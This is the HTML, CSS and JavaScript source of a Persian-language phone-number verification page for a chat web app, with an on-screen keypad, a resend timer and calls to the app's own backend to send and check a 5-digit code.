<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تایید کد</title>
    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;500;700;900&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Round" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: 'Vazirmatn', sans-serif;
            background: #0a0a0f;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }
        
        body::before {
            content: '';
            position: fixed;
            inset: 0;
            background: radial-gradient(ellipse at 20% 50%, rgba(60, 191, 138, 0.15) 0%, transparent 60%),
                        radial-gradient(ellipse at 80% 50%, rgba(36, 129, 204, 0.10) 0%, transparent 60%);
            z-index: 0;
        }
        
        .bg-circles {
            position: fixed;
            inset: 0;
            z-index: 0;
            overflow: hidden;
            pointer-events: none;
        }
        
        .bg-circles div {
            position: absolute;
            border-radius: 50%;
            opacity: 0.04;
            animation: floatCircle 20s ease-in-out infinite;
        }
        
        .bg-circles div:nth-child(1) {
            width: 400px;
            height: 400px;
            background: #3CBF8A;
            top: -100px;
            right: -100px;
            animation-delay: 0s;
        }
        
        .bg-circles div:nth-child(2) {
            width: 300px;
            height: 300px;
            background: #2481cc;
            bottom: -50px;
            left: -50px;
            animation-delay: -7s;
        }
        
        .bg-circles div:nth-child(3) {
            width: 200px;
            height: 200px;
            background: #8b5cf6;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            animation-delay: -14s;
        }
        
        @keyframes floatCircle {
            0%, 100% { transform: translate(0, 0) scale(1); }
            33% { transform: translate(30px, -30px) scale(1.1); }
            66% { transform: translate(-20px, 20px) scale(0.9); }
        }
        
        .container {
            position: relative;
            z-index: 1;
            width: 100%;
            max-width: 420px;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(30px);
            -webkit-backdrop-filter: blur(30px);
            border-radius: 32px;
            padding: 36px 28px 32px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.5);
            animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1);
        }
        
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px) scale(0.96); }
            to { opacity: 1; transform: translateY(0) scale(1); }
        }
        
        .back {
            display: inline-flex;
            align-items: center;
            gap: 4px;
            color: rgba(255, 255, 255, 0.4);
            text-decoration: none;
            font-size: 13px;
            font-weight: 400;
            cursor: pointer;
            transition: color 0.3s;
            margin-bottom: 20px;
        }
        
        .back:hover {
            color: rgba(255, 255, 255, 0.7);
        }
        
        .back .material-icons-round {
            font-size: 18px;
        }
        
        .verify-header {
            text-align: center;
            margin-bottom: 32px;
        }
        
        .verify-icon {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 68px;
            height: 68px;
            background: linear-gradient(135deg, #3CBF8A, #2ea87a);
            border-radius: 50%;
            font-size: 32px;
            margin-bottom: 12px;
            box-shadow: 0 8px 30px rgba(60, 191, 138, 0.25);
        }
        
        .verify-title {
            font-size: 22px;
            font-weight: 700;
            color: #fff;
        }
        
        .verify-sub {
            font-size: 13px;
            color: rgba(255, 255, 255, 0.4);
            font-weight: 300;
            margin-top: 4px;
        }
        
        .verify-sub strong {
            color: rgba(255, 255, 255, 0.6);
            font-weight: 500;
        }
        
        .code-container {
            display: flex;
            gap: 12px;
            justify-content: center;
            margin: 28px 0 24px;
        }
        
        .code-box {
            width: 52px;
            height: 62px;
            background: rgba(255, 255, 255, 0.04);
            border: 2px solid rgba(255, 255, 255, 0.06);
            border-radius: 14px;
            font-size: 26px;
            font-weight: 700;
            text-align: center;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            transition: all 0.3s;
            font-family: 'Vazirmatn', sans-serif;
        }
        
        .code-box.active {
            border-color: rgba(60, 191, 138, 0.5);
            box-shadow: 0 0 0 4px rgba(60, 191, 138, 0.08), inset 0 0 20px rgba(60, 191, 138, 0.05);
            background: rgba(60, 191, 138, 0.05);
        }
        
        .code-box.filled {
            border-color: rgba(60, 191, 138, 0.3);
            background: rgba(60, 191, 138, 0.08);
        }
        
        .code-box.error {
            border-color: #ff6b6b;
            animation: shake 0.4s ease;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-6px); }
            75% { transform: translateX(6px); }
        }
        
        .resend {
            text-align: center;
            font-size: 13px;
            color: rgba(255, 255, 255, 0.3);
            margin-bottom: 18px;
        }
        
        .resend a {
            color: #3CBF8A;
            text-decoration: none;
            font-weight: 500;
            cursor: pointer;
            transition: color 0.3s;
        }
        
        .resend a:hover {
            color: #4ddb9a;
        }
        
        .resend .countdown {
            color: rgba(255, 255, 255, 0.2);
            font-size: 12px;
        }
        
        .error-msg {
            color: #ff6b6b;
            font-size: 12px;
            text-align: center;
            display: none;
            margin-top: -8px;
            margin-bottom: 12px;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }
        
        .error-msg.show {
            display: flex;
        }
        
        .keyboard {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 16px;
        }
        
        .key {
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid rgba(255, 255, 255, 0.04);
            border-radius: 14px;
            padding: 16px;
            font-size: 24px;
            font-weight: 500;
            color: #fff;
            cursor: pointer;
            transition: all 0.15s;
            font-family: 'Vazirmatn', sans-serif;
            user-select: none;
        }
        
        .key:active {
            transform: scale(0.94);
            background: rgba(255, 255, 255, 0.08);
        }
        
        .key-del {
            color: #ff6b6b;
            font-size: 18px;
            background: rgba(255, 107, 107, 0.06);
            border-color: rgba(255, 107, 107, 0.06);
        }
        
        .key-del:active {
            background: rgba(255, 107, 107, 0.12);
        }
        
        .loader {
            display: none;
            width: 28px;
            height: 28px;
            border: 3px solid rgba(255, 255, 255, 0.1);
            border-top-color: #3CBF8A;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            margin: 0 auto 12px;
        }
        
        .loader.show {
            display: block;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        @media (prefers-color-scheme: light) {
            body { background: #f0f2f5; }
            body::before { display: none; }
            .bg-circles div { opacity: 0.1; }
            .container { background: rgba(255, 255, 255, 0.8); border-color: rgba(0, 0, 0, 0.05); box-shadow: 0 25px 60px rgba(0, 0, 0, 0.08); }
            .back { color: rgba(0, 0, 0, 0.3); }
            .back:hover { color: rgba(0, 0, 0, 0.6); }
            .verify-title { color: #1a1a2e; }
            .verify-sub { color: rgba(0, 0, 0, 0.3); }
            .verify-sub strong { color: rgba(0, 0, 0, 0.5); }
            .code-box { background: rgba(0, 0, 0, 0.02); border-color: rgba(0, 0, 0, 0.06); color: #1a1a2e; }
            .code-box.active { border-color: #3CBF8A; background: rgba(60, 191, 138, 0.05); }
            .code-box.filled { border-color: rgba(60, 191, 138, 0.2); background: rgba(60, 191, 138, 0.05); }
            .key { background: rgba(0, 0, 0, 0.02); border-color: rgba(0, 0, 0, 0.04); color: #1a1a2e; }
            .key:active { background: rgba(0, 0, 0, 0.06); }
            .key-del { color: #ef4444; background: rgba(239, 68, 68, 0.05); }
            .resend { color: rgba(0, 0, 0, 0.25); }
        }
        
        @media (max-width: 420px) {
            .container { padding: 24px 16px 24px; border-radius: 24px; }
            .code-box { width: 44px; height: 54px; font-size: 22px; }
            .key { padding: 14px; font-size: 20px; }
            .verify-icon { width: 56px; height: 56px; font-size: 26px; }
        }
    </style>
</head>
<body>

<div class="bg-circles">
    <div></div>
    <div></div>
    <div></div>
</div>

<div class="container">
    <a class="back" onclick="window.location.href='index.html'">
        <span class="material-icons-round">arrow_forward</span>
        بازگشت
    </a>

    <div class="verify-header">
        <div class="verify-icon">📲</div>
        <div class="verify-title">تایید شماره</div>
        <div class="verify-sub" id="subText">
            کد ۵ رقمی ارسال شده به <strong id="phoneDisplay">شماره</strong> را وارد کنید
        </div>
    </div>

    <div id="errorMsg" class="error-msg">
        <span class="material-icons-round">error_outline</span>
        <span id="errorText">کد نادرست است</span>
    </div>

    <div class="code-container" id="codeContainer">
        <div class="code-box active" data-index="0"></div>
        <div class="code-box" data-index="1"></div>
        <div class="code-box" data-index="2"></div>
        <div class="code-box" data-index="3"></div>
        <div class="code-box" data-index="4"></div>
    </div>

    <div class="loader" id="loader"></div>

    <div class="resend">
        <span class="countdown" id="countdownTimer">۰:۳۰</span>
        <span>·</span>
        <a id="resendBtn">ارسال مجدد</a>
    </div>

    <div class="keyboard" id="keyboard">
        <button class="key" data-value="1">1</button>
        <button class="key" data-value="2">2</button>
        <button class="key" data-value="3">3</button>
        <button class="key" data-value="4">4</button>
        <button class="key" data-value="5">5</button>
        <button class="key" data-value="6">6</button>
        <button class="key" data-value="7">7</button>
        <button class="key" data-value="8">8</button>
        <button class="key" data-value="9">9</button>
        <button class="key" data-value="" style="visibility:hidden;"></button>
        <button class="key" data-value="0">0</button>
        <button class="key key-del" data-value="del">⌫</button>
    </div>
</div>

<script>
    const WORKER_URL = "https://appp.salhamir146.workers.dev";
    let code = '';
    let timer = 30;
    let timerInterval = null;
    let isVerifying = false;

    const boxes = document.querySelectorAll('.code-box');
    const errorMsg = document.getElementById('errorMsg');
    const errorText = document.getElementById('errorText');
    const loader = document.getElementById('loader');
    const resendBtn = document.getElementById('resendBtn');
    const countdownTimer = document.getElementById('countdownTimer');
    const phoneDisplay = document.getElementById('phoneDisplay');

    const phone = localStorage.getItem('userPhone') || 'شماره';
    phoneDisplay.textContent = phone;

    function startTimer() {
        timer = 30;
        countdownTimer.textContent = '۰:' + String(timer).padStart(2, '0');
        resendBtn.style.pointerEvents = 'none';
        resendBtn.style.opacity = '0.3';

        if (timerInterval) clearInterval(timerInterval);
        
        timerInterval = setInterval(() => {
            timer--;
            countdownTimer.textContent = '۰:' + String(timer).padStart(2, '0');
            if (timer <= 0) {
                clearInterval(timerInterval);
                resendBtn.style.pointerEvents = 'auto';
                resendBtn.style.opacity = '1';
                countdownTimer.textContent = '';
            }
        }, 1000);
    }

    function updateBoxes() {
        boxes.forEach((box, i) => {
            box.textContent = code[i] || '';
            box.classList.remove('active', 'filled', 'error');
            if (i === code.length) box.classList.add('active');
            if (code[i]) box.classList.add('filled');
        });
    }

    async function verifyCode() {
        if (code.length !== 5 || isVerifying) return;
        
        isVerifying = true;
        loader.classList.add('show');
        errorMsg.classList.remove('show');

        try {
            const response = await fetch(`${WORKER_URL}/api/verify-code`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone, code })
            });

            const data = await response.json();

            if (data.success) {
                localStorage.setItem('userId', data.user.id);
                localStorage.setItem('userName', data.user.name);
                // انیمیشن موفقیت
                document.querySelector('.container').style.animation = 'slideUp 0.4s reverse';
                setTimeout(() => {
                    window.location.href = 'chats.html';
                }, 400);
            } else {
                errorText.textContent = data.message || 'کد نادرست است';
                errorMsg.classList.add('show');
                boxes.forEach(box => box.classList.add('error'));
                setTimeout(() => {
                    boxes.forEach(box => box.classList.remove('error'));
                }, 500);
                code = '';
                updateBoxes();
            }
        } catch (err) {
            errorText.textContent = 'خطا در ارتباط با سرور';
            errorMsg.classList.add('show');
            code = '';
            updateBoxes();
        } finally {
            isVerifying = false;
            loader.classList.remove('show');
        }
    }

    document.querySelectorAll('.key').forEach(key => {
        key.addEventListener('click', function() {
            if (isVerifying) return;
            const val = this.dataset.value;
            if (val === 'del') {
                code = code.slice(0, -1);
            } else if (val && code.length < 5) {
                code += val;
            }
            updateBoxes();
            if (code.length === 5) verifyCode();
        });
    });

    resendBtn.addEventListener('click', async function() {
        if (this.style.pointerEvents === 'none') return;
        
        try {
            const response = await fetch(`${WORKER_URL}/api/send-code`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone })
            });
            const data = await response.json();
            if (data.success) {
                startTimer();
                code = '';
                updateBoxes();
                errorMsg.classList.remove('show');
            } else {
                alert('خطا در ارسال مجدد کد');
            }
        } catch (err) {
            alert('خطا در ارتباط با سرور');
        }
    });

    document.addEventListener('keydown', (e) => {
        if (isVerifying) return;
        if (e.key >= '0' && e.key <= '9' && code.length < 5) {
            code += e.key;
            updateBoxes();
            if (code.length === 5) verifyCode();
            e.preventDefault();
        } else if (e.key === 'Backspace') {
            code = code.slice(0, -1);
            updateBoxes();
            e.preventDefault();
        }
    });

    startTimer();
    updateBoxes();
</script>
</body>
</html>
